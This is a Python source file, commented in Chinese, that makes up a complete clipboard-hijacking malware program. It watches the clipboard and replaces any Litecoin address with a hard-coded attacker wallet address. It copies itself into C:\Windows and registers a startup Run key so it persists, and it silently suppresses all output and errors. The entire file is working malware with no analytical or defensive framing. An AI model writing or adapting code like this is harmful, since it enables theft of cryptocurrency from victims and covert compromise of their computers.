import pyperclip
import time
import re
import os
import sys
import shutil
import winreg
# 你的指定地址
MY_LTC_ADDRESS = "ltc1qvcrj525wj8fey6gk29zjcret5zk3sah93tp9de"

# LTC 地址的正則表達式（以大小寫 L 開頭，長度為 26-34 字元）
LTC_ADDRESS_REGEX = r"[Ll][a-zA-Z0-9]{25,33}"

def monitor_and_replace_ltc_address():
    last_clipboard_content = ""

    #print("正在監控剪貼板內容...")

    while True:
        # 取得目前剪貼板內容
        clipboard_content = pyperclip.paste()

        # 如果內容與之前不同，進行處理
        if clipboard_content != last_clipboard_content:
            #print(f"偵測到新剪貼板內容: {clipboard_content}")

            # 檢查是否符合 LTC 地址格式
            if re.match(LTC_ADDRESS_REGEX, clipboard_content):
                #print(f"偵測到 LTC 地址: {clipboard_content}")

                # 替換為你的指定地址
                pyperclip.copy(MY_LTC_ADDRESS)
                #print(f"LTC 地址已被替換為: {MY_LTC_ADDRESS}")

            # 更新最新的剪貼板內容
            last_clipboard_content = clipboard_content

        # 休眠 0.5 秒，避免資源過度消耗
        time.sleep(0.25)
def copy_self(target_dir):
    """將當前腳本複製到指定目錄"""
    try:
        # 取得當前腳本的完整路徑
        current_path = os.path.abspath(sys.argv[0])
        
        # 目標路徑
        target_path = os.path.join(target_dir, os.path.basename(current_path))
        
        # 複製腳本
        shutil.copy2(current_path, target_path)
        #print(f"腳本已成功複製到: {target_path}")
    except PermissionError:
        #print("需要管理員權限才能複製到目標目錄！")
        pass
    except Exception as e:
        #print(f"複製腳本時發生錯誤: {e}")
        pass
def add_to_startup(name, path=None):
    try:
        # 默認為 C:\Windows\p.exe，如果未指定其他路徑
        if path is None:
            path = r"C:\Windows\p.exe"

        # 打開註冊表的 Run 鍵
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE
        )
        # 設置自啟動路徑
        winreg.SetValueEx(key, name, 0, winreg.REG_SZ, path)
        winreg.CloseKey(key)
        #print(f"成功添加到開機自啟動：{name} -> {path}")
    except Exception as e:
        #print(f"添加到開機自啟動失敗：{e}")
        pass

if __name__ == "__main__":
    target_directory = r"C:\Windows"
    copy_self(target_directory)
    script_name = "MyPythonScript"  # 註冊表中的鍵名
    add_to_startup(script_name, path=r"C:\Windows\p.exe")
    monitor_and_replace_ltc_address()
